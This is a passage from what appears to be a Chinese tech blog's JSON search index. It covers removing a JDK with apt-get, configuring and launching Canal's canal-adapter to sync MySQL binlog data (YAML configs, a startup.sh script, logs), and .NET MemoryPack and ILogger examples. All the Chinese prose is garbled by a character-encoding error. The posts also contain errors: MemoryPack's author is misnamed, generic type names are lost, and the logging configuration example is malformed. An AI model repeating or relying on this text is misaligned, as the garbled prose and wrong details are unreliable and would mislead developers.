1dpkg --list | grep -i jdk ä¸€æ—¦çŸ¥é“äº†è¦å¸è½½çš„JDKåŒ…çš„ç¡®åˆ‡åç§°ï¼Œä½¿ç”¨apt-getå‘½ä»¤å¸è½½å®ƒï¼š 1sudo apt-get remove your-jdk-package-name å°†your-jdk-package-nameæ›¿æ¢ä¸ºä»åˆ—è¡¨ä¸­æ‰¾åˆ°çš„å®é™…JDKåŒ…åç§°ã€‚å¦‚æœæƒ³åŒæ—¶åˆ é™¤é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨â€“purgeé€‰é¡¹ï¼š 1sudo apt-get purge your-jdk-package-name æœ€åï¼Œè¿è¡Œautoremoveæ¥æ¸…é™¤ç³»ç»Ÿä¸­ä¸å†éœ€è¦çš„ä¾èµ–é¡¹ï¼š 1sudo apt-get autoremove ä¾‹å¦‚ï¼Œå¦‚æœå®‰è£…çš„æ˜¯OpenJDK 11ï¼Œå¹¶ä¸”é€šè¿‡aptå®‰è£…ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å¸è½½ï¼š 12sudo apt-get remove openjdk-11-jdksudo apt-get autoremove canal-deployer å’Œ canal-adapter æ˜¯ Canal çš„ä¸¤ä¸ªç‹¬ç«‹æ¨¡å—ï¼Œå„è‡ªæ‰¿æ‹…ä¸åŒçš„åŠŸèƒ½ï¼šcanal-deployeråŠŸèƒ½ï¼šcanal-deployer æ˜¯ Canal çš„æ ¸å¿ƒç»„ä»¶ï¼Œç”¨äºä» MySQL æ•°æ®åº“ä¸­è¯»å– binlogï¼Œå¹¶è§£æ binlog äº‹ä»¶ã€‚ä½œç”¨ï¼šä¸»è¦è´Ÿè´£æ•°æ®çš„å®æ—¶æ•è·å’Œè§£æã€‚å®ƒå°†ä» MySQL å®ä¾‹æ•è·çš„ binlog æ•°æ®è½¬æ¢æˆ Canal å¯ä»¥å¤„ç†çš„æ ¼å¼ï¼Œå¹¶é€šè¿‡ç½‘ç»œæˆ–å…¶ä»–æ–¹å¼å°†è¿™äº›æ•°æ®æ¨é€ç»™ä¸‹æ¸¸æ¶ˆè´¹è€…ã€‚é…ç½®ï¼šcanal-deployer éœ€è¦é…ç½®è¿æ¥ä¿¡æ¯ï¼ˆå¦‚ MySQL çš„åœ°å€ã€ç”¨æˆ·åã€å¯†ç ç­‰ï¼‰ä»¥åŠç›¸å…³çš„è¿‡æ»¤æ¡ä»¶ï¼Œæ¯”å¦‚è¦ç›‘æ§çš„è¡¨å’Œè¿‡æ»¤çš„å­—æ®µã€‚åº”ç”¨åœºæ™¯ï¼šé€‚ç”¨äºéœ€è¦æ•è· MySQL æ•°æ®å˜æ›´çš„åœºæ™¯ï¼Œæ¯”å¦‚æ•°æ®åº“çš„å®æ—¶å¢é‡æ•°æ®åŒæ­¥å’Œæ•°æ®ç›‘æ§ã€‚ canal-adapteråŠŸèƒ½ï¼šcanal-adapter è´Ÿè´£å°† Canal æ•è·å¹¶è§£æçš„æ•°æ®ï¼Œé€‚é…å¹¶åŒæ­¥åˆ°ä¸åŒçš„ä¸‹æ¸¸ç›®æ ‡ã€‚ä½œç”¨ï¼šå¯ä»¥å°†æ•°æ®å†™å…¥åˆ° ElasticSearchã€Kafkaã€HBase ç­‰å¤šç§ç›®æ ‡ï¼Œèµ·åˆ°æ•°æ®åŒæ­¥çš„æ¡¥æ¢ä½œç”¨ã€‚é…ç½®ï¼šcanal-adapter æä¾›äº†ä¸°å¯Œçš„é€‚é…å™¨é…ç½®ï¼ˆå¦‚ ESã€Kafkaã€RocketMQ ç­‰ï¼‰ï¼Œå¯ä»¥æ ¹æ®ä¸šåŠ¡éœ€æ±‚é…ç½®åŒæ­¥çš„å­—æ®µæ˜ å°„ã€æ•°æ®è½¬æ¢å’Œè¿‡æ»¤è§„åˆ™ã€‚åº”ç”¨åœºæ™¯ï¼šé€‚ç”¨äºéœ€è¦å°† MySQL çš„ binlog æ•°æ®å®æ—¶åŒæ­¥åˆ°å…¶ä»–æ•°æ®å­˜å‚¨æˆ–æ¶ˆæ¯é˜Ÿåˆ—çš„åœºæ™¯ï¼Œæ¯”å¦‚æ•°æ®ä»“åº“åŒæ­¥ã€å®æ—¶ç´¢å¼•ç­‰ã€‚ æ€»ç»“canal-deployer ä¸“æ³¨äºä» MySQL è¯»å–å¹¶è§£æ binlog æ•°æ®ã€‚canal-adapter åˆ™å°†è§£æåçš„æ•°æ®æ¨é€æˆ–åŒæ­¥åˆ°ä¸‹æ¸¸ç›®æ ‡ï¼Œèµ·åˆ°æ•°æ®é€‚é…å’Œè½¬æ¢çš„ä½œç”¨ã€‚ é…ç½®å’Œå¯åŠ¨canal-adapteré…ç½®canal-adapter ä¿®æ”¹application.ymlæ–‡ä»¶ 12cd /usr/local/canal/canal-adapter/confvi application.yml 123# canal tcp consumer# ä¿®æ”¹ä½ç½®ï¼šCanal deployeræ‰€åœ¨ä¸»æœºIPcanal.tcp.server.host: 192.168.91.135:11111 ä¿®æ”¹ä½ç½®ï¼šæ·»åŠ æºåº“é…ç½®ä¿¡æ¯ï¼Œæ­¤å¤„ä¸ºåŒæ­¥åŒåº“ä¸‹æ‰€æœ‰è¡¨ä¿¡æ¯ 123456789101112131415161718srcDataSources: defaultDS: url: jdbc:mysql://124.219.119.xxx:3306/IMDB?useUnicode=true&amp;characterEncoding=utf8mb4&amp;autoReconnect=true&amp;useSSL=false username: root password: 123123.xxcanalAdapters:- instance: example # canal instance Name or mq topic name groups: - groupId: g1 outerAdapters: - name: logger - name: rdb key: mysql1 properties: jdbc.driverClassName: com.mysql.jdbc.Driver jdbc.url: jdbc:mysql://192.168.80.xxx/IMDB?useUnicode=true&amp;characterEncoding=utf8mb4&amp;autoReconnect=true&amp;useSSL=false jdbc.username: root jdbc.password: 123123.xx è¯´æ˜: å…¶ä¸­ outAdapter çš„é…ç½®: nameç»Ÿä¸€ä¸ºrdb, keyä¸ºå¯¹åº”çš„æ•°æ®æºçš„å”¯ä¸€æ ‡è¯†éœ€å’Œä¸‹é¢çš„è¡¨æ˜ å°„æ–‡ä»¶ä¸­çš„outerAdapterKeyå¯¹åº”, propertiesä¸ºç›®æ ‡åº“jdbcçš„ç›¸å…³å‚æ•° adapterå°†ä¼šè‡ªåŠ¨åŠ è½½ conf&#x2F;rdb ä¸‹çš„æ‰€æœ‰.ymlç»“å°¾çš„è¡¨æ˜ å°„é…ç½®æ–‡ä»¶ ä¿®æ”¹canal-adapter&#x2F;conf&#x2F;rdbæ–‡ä»¶å¤¹ä¸‹çš„ymlæ–‡ä»¶è¯´æ˜ï¼šcanal-adapter&#x2F;conf&#x2F;rdbæ–‡ä»¶å¤¹ä¸‹çš„ymlæ–‡ä»¶å¯ä»¥åŒæ­¥æ•°æ®åº“ä¸‹çš„ä¸€å¼ è¡¨ï¼Œä¹Ÿå¯ä»¥åŒæ­¥æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨(æ­¤å¤„çš„å‰ææ˜¯ï¼šåŒæ­¥æ•°æ®çš„æ•°æ®åº“ä¸ä¸»åº“çš„schemaä¸€è‡´) 1234567891011121314cd /usr/local/canal/canal-adapter/conf/rdb.yml## Mirror schema synchronize configdataSourceKey: defaultDSdestination: examplegroupId: g1outerAdapterKey: mysql1concurrent: truedbMapping: mirrorDb: true database: test å¯åŠ¨canal-adapter12cd /usr/local/canal/canal-adapter/bin./startup.sh æŸ¥çœ‹æ—¥å¿—ä¿¡æ¯ï¼Œç¡®ä¿æ­£å¸¸å¯åŠ¨ã€‚ 12cd /usr/local/canal/canal-adapter/logs/adaptercat adapter.log log err[main] ERROR org.springframework.boot.SpringApplication - Application run failedorg.yaml.snakeyaml.error.YAMLException: å¦‚æœæ²¡æœ‰log æˆ–å¯åŠ¨ä¸æˆåŠŸ ç§»é™¤æœªæ”¯æŒçš„ JVM å‚æ•°-XX:+UseFastAccessorMethods-XX:+PrintAdaptiveSizePolicy-XX:+PrintTenuringDistribution å‚è€ƒ1 å»æ‰ -XX:+AggressiveOpts -XX:-UseBiasedLocking-XX:+UseFastAccessorMethods å»æ‰str&#x3D;file -L $JAVA | grep 64-bit JAVA_OPTS&#x3D;â€$JAVA_OPTS -Xss1m -XX:-OmitStackTraceInFastThrow -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath&#x3D;$base&#x2F;logsâ€if [ $JavaVersion -ge 11 ] ; then #JAVA_OPTS&#x3D;â€$JAVA_OPTS -Xlog:gc*:$base_log&#x2F;gc.log:time â€œ JAVA_OPTS&#x3D;â€$JAVA_OPTSâ€else #JAVA_OPTS&#x3D;â€$JAVA_OPTS -Xloggc:$base&#x2F;logs&#x2F;canal&#x2F;gc.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCApplicationStoppedTimeâ€ JAVA_OPTS&#x3D;â€$JAVA_OPTS -XX:+PrintAdaptiveSizePolicy -XX:+PrintTenuringDistributionâ€fi 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#!/bin/bashcurrent_path=`pwd`case &quot;`uname`&quot; in Linux) bin_abs_path=$(readlink -f $(dirname $0)) ;; *) bin_abs_path=`cd $(dirname $0); pwd` ;;esacbase=$&#123;bin_abs_path&#125;/..export LANG=en_US.UTF-8export BASE=$baseif [ -f $base/bin/adapter.pid ] ; then echo &quot;found adapter.pid , Please run stop.sh first ,then startup.sh&quot; 2&gt;&amp;2 exit 1fiif [ ! -d $base/logs ] ; then mkdir -p $base/logsfi## set java pathif [ -z &quot;$JAVA&quot; ] ; then JAVA=$(which java)fiALIBABA_JAVA=&quot;/usr/alibaba/java/bin/java&quot;TAOBAO_JAVA=&quot;/opt/taobao/java/bin/java&quot;if [ -z &quot;$JAVA&quot; ]; then if [ -f $ALIBABA_JAVA ] ; then JAVA=$ALIBABA_JAVA elif [ -f $TAOBAO_JAVA ] ; then JAVA=$TAOBAO_JAVA else echo &quot;Cannot find a Java JDK. Please set either set JAVA or put java (&gt;=1.5) in your PATH.&quot; 2&gt;&amp;2 exit 1 fificase &quot;$#&quot;in0 ) ;;2 ) if [ &quot;$1&quot; = &quot;debug&quot; ]; then DEBUG_PORT=$2 DEBUG_SUSPEND=&quot;n&quot; JAVA_DEBUG_OPT=&quot;-Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,address=$DEBUG_PORT,server=y,suspend=$DEBUG_SUSPEND&quot; fi ;;* ) echo &quot;THE PARAMETERS MUST BE TWO OR LESS.PLEASE CHECK AGAIN.&quot; exit;;esacJavaVersion=`$JAVA -version 2&gt;&amp;1 |awk &#x27;NR==1&#123; gsub(/&quot;/,&quot;&quot;); print $3 &#125;&#x27; | awk -F &#x27;.&#x27; &#x27;&#123;print $1&#125;&#x27;`str=`file -L $JAVA | grep 64-bit`JAVA_OPTS=&quot;$JAVA_OPTS -Xss1m -XX:-UseBiasedLocking -XX:-OmitStackTraceInFastThrow -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=$base/logs&quot;if [ $JavaVersion -ge 11 ] ; then #JAVA_OPTS=&quot;$JAVA_OPTS -Xlog:gc*:$base_log/gc.log:time &quot; JAVA_OPTS=&quot;$JAVA_OPTS&quot;else #JAVA_OPTS=&quot;$JAVA_OPTS -Xloggc:$base/logs/canal/gc.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCApplicationStoppedTime&quot; -XX:+UseFastAccessorMethods -XX:+PrintAdaptiveSizePolicy -XX:+PrintTenuringDistribution JAVA_OPTS=&quot;$JAVA_OPTS&quot;fiif [ -n &quot;$str&quot; ]; then if [ $JavaVersion -ge 11 ] ; then # For G1 JAVA_OPTS=&quot;-server -Xms2g -Xmx3g -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:+UseGCOverheadLimit $JAVA_OPTS&quot; else JAVA_OPTS=&quot;-server -Xms2g -Xmx3g -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:+UseGCOverheadLimit $JAVA_OPTS&quot; fielse JAVA_OPTS=&quot;-server -Xms2g -Xmx3g -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:+UseGCOverheadLimit $JAVA_OPTS&quot;fiJAVA_OPTS=&quot; $JAVA_OPTS -Djava.awt.headless=true -Djava.net.preferIPv4Stack=true -Dfile.encoding=UTF-8&quot;ADAPTER_OPTS=&quot;-DappName=canal-adapter&quot;for i in $base/lib/*; do CLASSPATH=$i:&quot;$CLASSPATH&quot;;doneCLASSPATH=&quot;$base/conf:$CLASSPATH&quot;;echo &quot;cd to $bin_abs_path for workaround relative path&quot;cd $bin_abs_pathecho CLASSPATH :$CLASSPATH$JAVA $JAVA_OPTS $JAVA_DEBUG_OPT $ADAPTER_OPTS -classpath .:$CLASSPATH com.alibaba.otter.canal.adapter.launcher.CanalAdapterApplication 1&gt;&gt;/dev/null 2&gt;&amp;1 &amp;echo $! &gt; $base/bin/adapter.pidecho &quot;cd to $current_path for continue&quot;cd $current_path .&#x2F;startup.sh å¯åŠ¨æˆåŠŸlog 2024-11-15 16:43:42.033 [main] INFO c.a.o.canal.adapter.launcher.loader.CanalAdapterLoader - Start adapter for canal-client mq topic: example-g1 succeed2024-11-15 16:43:42.034 [main] INFO c.a.o.canal.adapter.launcher.loader.CanalAdapterService - ## the canal client adapters are running now â€¦â€¦2024-11-15 16:43:42.035 [Thread-3] INFO c.a.otter.canal.adapter.launcher.loader.AdapterProcessor - &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; Start to connect destination: example &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;2024-11-15 16:43:42.047 [main] INFO c.a.otter.canal.adapter.launcher.CanalAdapterApplication - Started CanalAdapterApplication in 1.721 seconds (JVM running for 2.038)2024-11-15 16:43:42.109 [Thread-3] INFO c.a.otter.canal.adapter.launcher.loader.AdapterProcessor - &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; Subscribe destination: example succeed &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; æ’å…¥åŸsqlåˆ™å¯ä»¥çœ‹åˆ° canalçš„æ•°æ®åº“ä¹Ÿæ’å…¥åœ¨ä¸»åº“testæ•°æ®åº“ä¸‹çš„userè¡¨ä¸­æ’å…¥æ•°æ®ï¼ŒæŸ¥çœ‹canalæ‰€åœ¨æ•°æ®åº“testä¸‹çš„userè¡¨ä¸­æ˜¯å¦åŒæ­¥ã€‚ Canal ä¾èµ–ä¸»é”®æˆ–å”¯ä¸€é”®æ¥ç¡®å®šåŒæ­¥æ•°æ®å¦‚æœæœ‰æ–°å¢å”¯ä¸€é”®ï¼Œåˆ™ä¹Ÿéœ€è¦bakåˆ°å¤‡ä»½çš„æ•°æ®åº“ä¸­æ‰èƒ½æ­£ç¡®å¤‡ä»½","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://banjinmei.github.io/tags/mysql/"},{"name":"canal","slug":"canal","permalink":"https://banjinmei.github.io/tags/canal/"}],"author":"mu"},{"title":".NET MemoryPack","slug":"NET-MemoryPack","date":"2024-11-13T16:57:37.000Z","updated":"2024-11-13T16:59:25.442Z","comments":true,"path":"2024/11/14/NET-MemoryPack/","permalink":"https://banjinmei.github.io/2024/11/14/NET-MemoryPack/","excerpt":"","text":"MemoryPackæ˜¯ä¸€ä¸ªé«˜æ•ˆçš„æ•°æ®åºåˆ—åŒ–åº“ï¼Œå®ƒä¸“æ³¨äºæ€§èƒ½ä¼˜åŒ–ï¼Œé€‚ç”¨äºéœ€è¦å¿«é€Ÿåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„åœºæ™¯ã€‚è¿™ä¸ªåº“æ˜¯ç”± Yuki Yogo å¼€å‘çš„ï¼Œå¹¶ä¸”åœ¨ .NET ç¤¾åŒºä¸­è·å¾—äº†ç›¸å½“çš„å…³æ³¨ã€‚MemoryPack æ”¯æŒé›¶æ‹·è´ï¼ˆzero-copyï¼‰è¯»å–ï¼Œè¿™æ„å‘³ç€å¯ä»¥åœ¨ä¸éœ€è¦é¢å¤–å†…å­˜åˆ†é…çš„æƒ…å†µä¸‹ç›´æ¥ä»åŸå§‹å­—èŠ‚æ•°æ®ä¸­è¯»å–å€¼ã€‚ MemoryPackä½¿ç”¨ç¤ºä¾‹ï¼ŒåŒ…æ‹¬å®šä¹‰ä¸€ä¸ªå¯åºåˆ—åŒ–çš„ç±»ã€åºåˆ—åŒ–å¯¹è±¡ä»¥åŠååºåˆ—åŒ–å›å¯¹è±¡çš„è¿‡ç¨‹ã€‚ å®‰è£… MemoryPacké¦–å…ˆï¼Œéœ€è¦å®‰è£… MemoryPack åº“ã€‚å¯ä»¥é€šè¿‡ NuGet åŒ…ç®¡ç†å™¨æ¥å®‰è£…ï¼š 1dotnet add package MemoryPack æˆ–è€…åœ¨ Visual Studio ä¸­ä½¿ç”¨ NuGet åŒ…ç®¡ç†å™¨ç•Œé¢æ¥å®‰è£…ã€‚ å®šä¹‰å¯åºåˆ—åŒ–çš„ç±»ä¸ºäº†ä½¿ä¸€ä¸ªç±»èƒ½å¤Ÿè¢« MemoryPack åºåˆ—åŒ–ï¼Œéœ€è¦ä¸ºè¯¥ç±»æ·»åŠ  [MemoryPackable] å±æ€§ï¼Œå¹¶ä¸ºç±»ä¸­çš„æ¯ä¸ªå­—æ®µæˆ–å±æ€§æ·»åŠ  [MemoryPackIgnore] å±æ€§ï¼ˆå¦‚æœæƒ³è¦å¿½ç•¥æŸäº›å­—æ®µæˆ–å±æ€§çš„è¯ï¼‰ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š 1234567891011121314using System;using MemoryPack;[MemoryPackable]public partial class Person&#123; public string Name &#123; get; set; &#125; public int Age &#123; get; set; &#125; [MemoryPackIgnore] public string NotSerializedProperty &#123; get; set; &#125;&#125; æ³¨æ„ï¼špartial å…³é”®å­—æ˜¯å¿…é¡»çš„ï¼Œå› ä¸º MemoryPack åœ¨ç¼–è¯‘æ—¶ä¼šç”Ÿæˆä¸€äº›é¢å¤–çš„ä»£ç æ¥æ”¯æŒåºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–ã€‚ åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª Person å¯¹è±¡ï¼Œç„¶åä½¿ç”¨ MemoryPack å°†å…¶åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„ï¼Œå†ä»å­—èŠ‚æ•°ç»„ååºåˆ—åŒ–å› Person å¯¹è±¡ã€‚ 1234567891011121314151617181920212223242526using System;using MemoryPack;class Program&#123; static void Main() &#123; // åˆ›å»ºä¸€ä¸ª Person å®ä¾‹ var person = new Person &#123; Name = &quot;John Doe&quot;, Age = 30, NotSerializedProperty = &quot;This will not be serialized&quot; &#125;; // åºåˆ—åŒ– byte[] serialized = MemoryPackSerializer.Serialize(person); // ååºåˆ—åŒ– ï¼ˆé›¶æ‹·è´ï¼‰ Person deserializedPerson = MemoryPackSerializer.Deserialize&lt;Person&gt;(serialized); // è¾“å‡ºç»“æœ Console.WriteLine($&quot;Name: &#123;deserializedPerson.Name&#125;, Age: &#123;deserializedPerson.Age&#125;&quot;); // æ³¨æ„ï¼šNotSerializedProperty ä¸ä¼šè¢«è¾“å‡ºï¼Œå› ä¸ºå®ƒæ²¡æœ‰è¢«åºåˆ—åŒ– &#125;&#125; æ³¨æ„äº‹é¡¹MemoryPack æ”¯æŒå¤§å¤šæ•°åŸºæœ¬ç±»å‹å’Œå¤æ‚ç±»å‹ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›é™åˆ¶ï¼Œä¾‹å¦‚ä¸æ”¯æŒå¾ªç¯å¼•ç”¨çš„å¯¹è±¡å›¾ã€‚å¦‚æœçš„é¡¹ç›®ä¸­å­˜åœ¨å¤šä¸ªéœ€è¦åºåˆ—åŒ–çš„ç±»ï¼Œæ¯ä¸ªç±»éƒ½éœ€è¦æ ‡è®° [MemoryPackable] å¹¶ä¸”æ˜¯ partial ç±»å‹ã€‚ç”±äº MemoryPack ä½¿ç”¨äº†æºç”Ÿæˆå™¨ï¼ˆsource generatorsï¼‰ï¼Œå› æ­¤å®ƒåœ¨ç¼–è¯‘æ—¶ä¼šç”Ÿæˆé¢å¤–çš„ä»£ç ï¼Œè¿™å¯èƒ½ä¼šç¨å¾®å¢åŠ æ„å»ºæ—¶é—´ï¼Œä½†å¯ä»¥æ˜¾è‘—æé«˜è¿è¡Œæ—¶çš„æ€§èƒ½ã€‚ä»¥ä¸Šå°±æ˜¯ä¸€ä¸ªä½¿ç”¨ MemoryPack è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç®€å•ç¤ºä¾‹ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":".NET ILogger","slug":"NET-ILogger","date":"2024-11-13T16:55:06.000Z","updated":"2024-11-13T16:56:46.669Z","comments":true,"path":"2024/11/14/NET-ILogger/","permalink":"https://banjinmei.github.io/2024/11/14/NET-ILogger/","excerpt":"","text":"ILogger æ˜¯ ASP.NET Core ä¸­çš„ä¸€ä¸ªæ¥å£ï¼Œç”¨äºè®°å½•åº”ç”¨ç¨‹åºçš„æ—¥å¿—ä¿¡æ¯ã€‚å®ƒæ˜¯ä¸€ä¸ªæ³›å‹æ¥å£ï¼Œå…¶ä¸­ T æ˜¯æ—¥å¿—è®°å½•çš„ä¸Šä¸‹æ–‡ç±»å‹ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œä¼šä½¿ç”¨ ILogger æ¥å£è€Œä¸æ˜¯ ILoggerï¼Œé™¤ééœ€è¦å°†ç‰¹å®šçš„ä¸Šä¸‹æ–‡ç±»å‹ä¼ é€’ç»™æ—¥å¿—è®°å½•å™¨ã€‚ ILogger çš„ç¤ºä¾‹ï¼š 1. æ³¨å…¥ ILoggeråœ¨çš„æ§åˆ¶å™¨ã€æœåŠ¡æˆ–å…¶ä»–ä¾èµ–æ³¨å…¥ç»„ä»¶ä¸­ï¼Œå¯ä»¥æ³¨å…¥ ILogger æˆ– ILoggerã€‚ä¾‹å¦‚ï¼Œåœ¨æ§åˆ¶å™¨ä¸­æ³¨å…¥ ILoggerï¼š 1234567891011public class YourController : ControllerBase&#123; private readonly ILogger&lt;YourController&gt; _logger; public YourController(ILogger&lt;YourController&gt; logger) &#123; _logger = logger; &#125; // ...&#125; æˆ–è€…ï¼Œå¦‚æœä¸éœ€è¦ç‰¹å®šçš„ä¸Šä¸‹æ–‡ç±»å‹ï¼Œå¯ä»¥æ³¨å…¥ ILoggerï¼š 1234567891011public class YourService&#123; private readonly ILogger _logger; public YourService(ILogger logger) &#123; _logger = logger; &#125; // ...&#125; 2. è®°å½•æ—¥å¿—ä½¿ç”¨ _logger å¯¹è±¡è®°å½•ä¸åŒçº§åˆ«çš„æ—¥å¿—ï¼Œä¾‹å¦‚ï¼š 123_logger.LogInformation(&quot;This is an information message.&quot;);_logger.LogWarning(&quot;This is a warning message.&quot;);_logger.LogError(&quot;This is an error message.&quot;, exception); 3. é…ç½®æ—¥å¿—è®°å½•åœ¨ appsettings.json æˆ–å…¶ä»–é…ç½®æ–‡ä»¶ä¸­é…ç½®æ—¥å¿—è®°å½•çº§åˆ«å’Œè¾“å‡ºç›®æ ‡ã€‚ä¾‹å¦‚ï¼Œåœ¨ appsettings.Development.json ä¸­ï¼š 123456789&#123; &quot;Logging&quot;: &#123; &quot;LogLevel&quot;: &#123; &quot;Default&quot;: &quot;Debug&quot;, &quot;System&quot;: &quot;Information&quot;, &quot;Microsoft&quot;: &quot;Warning&quot; &#125; &#125;&#125; è¿™å°†è®¾ç½®é»˜è®¤æ—¥å¿—çº§åˆ«ä¸º Debugï¼Œç³»ç»Ÿæ—¥å¿—çº§åˆ«ä¸º Informationï¼ŒMicrosoft æ—¥å¿—çº§åˆ«ä¸º Warningã€‚ è¿˜å¯ä»¥é…ç½®æ—¥å¿—è®°å½•å™¨å°†æ—¥å¿—è¾“å‡ºåˆ°æ§åˆ¶å°ã€æ–‡ä»¶æˆ–å…¶ä»–ç›®æ ‡ã€‚ä¾‹å¦‚ï¼Œåœ¨ appsettings.json ä¸­ï¼š 123456789101112131415161718192021222324252627&#123; &quot;Logging&quot;: &#123; &quot;Console&quot;: &#123; &quot;IncludeScopes&quot;: false, &quot;Debug&quot;: &#123; &quot;LogLevel&quot;: &#123; &quot;Default&quot;: &quot;Information&quot; &#125; &#125;, &quot;Info&quot;: &#123; &quot;LogLevel&quot;: &#123; &quot;Default&quot;: &quot;Warning&quot; &#125; &#125;, &quot;Warning&quot;: &#123; &quot;LogLevel&quot;: &#123; &quot;Default&quot;: &quot;Error&quot; &#125; &#125;, &quot;Error&quot;: &#123; &quot;LogLevel&quot;: &#123; &quot;Default&quot;: &quot;Critical&quot; &#125; &#125; &#125; &#125;&#125; è¿™å°†é…ç½®æ§åˆ¶å°æ—¥å¿—è®°å½•å™¨ï¼Œå¹¶ä¸ºä¸åŒçº§åˆ«çš„æ—¥å¿—è®¾ç½®ä¸åŒçš„è¾“å‡ºçº§åˆ«ã€‚ æ€»ä¹‹ï¼ŒILogger å’Œ ILogger æä¾›äº†ä¸€ç§çµæ´»ä¸”å¼ºå¤§çš„æ–¹å¼æ¥è®°å½•åº”ç”¨ç¨‹åºçš„æ—¥å¿—ä¿¡æ¯ã€‚é€šè¿‡é…ç½®ä¸åŒçš„æ—¥å¿—çº§åˆ«å’Œè¾“å‡ºç›®æ ‡ï¼Œå¯ä»¥è½»æ¾åœ°æ»¡è¶³å„ç§æ—¥å¿—è®°å½•éœ€æ±‚ã€‚ æ—¥å¿—çº§åˆ«å’Œåˆ†ç±»ï¼šILogger æä¾›äº†æ—¥å¿—çº§åˆ«çš„æ¦‚å¿µï¼Œå¦‚ Traceã€Debugã€Infoã€Warningã€Error å’Œ Criticalã€‚è¿™å…è®¸å¼€å‘è€…æ ¹æ®éœ€è¦è®°å½•ä¸åŒä¸¥é‡ç¨‹åº¦çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å¯ä»¥åœ¨é…ç½®ä¸­è®¾ç½®æ—¥å¿—çº§åˆ«ï¼Œä»¥ä¾¿åœ¨ä¸åŒç¯å¢ƒä¸­ï¼ˆå¦‚å¼€å‘ã€æµ‹è¯•ã€ç”Ÿäº§ï¼‰æ˜¾ç¤ºæˆ–éšè—æŸäº›çº§åˆ«çš„æ—¥å¿—ã€‚Console.WriteLine åªæ˜¯ç®€å•åœ°å°†æ–‡æœ¬è¾“å‡ºåˆ°æ§åˆ¶å°ï¼Œæ²¡æœ‰æ—¥å¿—çº§åˆ«çš„æ¦‚å¿µã€‚ å¯é…ç½®æ€§ï¼šILogger æ˜¯å¯é…ç½®çš„ï¼Œå¯ä»¥é…ç½®æ—¥å¿—è®°å½•å™¨å°†æ—¥å¿—è¾“å‡ºåˆ°ä¸åŒçš„ç›®æ ‡ï¼ˆå¦‚æ–‡ä»¶ã€æ•°æ®åº“ã€ç½‘ç»œæœåŠ¡ç­‰ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥è®¾ç½®ä¸åŒçš„æ ¼å¼åŒ–é€‰é¡¹ã€‚Console.WriteLine åªæ˜¯å°†è¾“å‡ºå‘é€åˆ°æ§åˆ¶å°ï¼Œæ²¡æœ‰å¯é…ç½®çš„è¾“å‡ºç›®æ ‡æˆ–æ ¼å¼åŒ–é€‰é¡¹ã€‚ ç»“æ„åŒ–æ—¥å¿—ï¼šILogger æ”¯æŒç»“æ„åŒ–æ—¥å¿—è®°å½•ï¼Œè¿™æ„å‘³ç€å¯ä»¥è®°å½•åŒ…å«é”®å€¼å¯¹çš„å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡å¯ä»¥æ›´å®¹æ˜“åœ°è¢«æ—¥å¿—åˆ†æå·¥å…·è§£æå’ŒæŸ¥è¯¢ã€‚Console.WriteLine åªèƒ½è¾“å‡ºæ–‡æœ¬å­—ç¬¦ä¸²ï¼Œä¸æ”¯æŒç»“æ„åŒ–æ—¥å¿—ã€‚ é›†æˆå’Œæ‰©å±•æ€§ï¼šILogger æ˜¯ ASP.NET Core å’Œè®¸å¤šå…¶ä»– .NET åº”ç”¨ç¨‹åºæ¡†æ¶çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒä¸å…¶ä»–æ¡†æ¶ç»„ä»¶ï¼ˆå¦‚ä¾èµ–æ³¨å…¥ã€ä¸­é—´ä»¶ç­‰ï¼‰é›†æˆè‰¯å¥½ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç¬¬ä¸‰æ–¹åº“è½»æ¾æ‰©å±•ã€‚Console.WriteLine æ˜¯ .NET 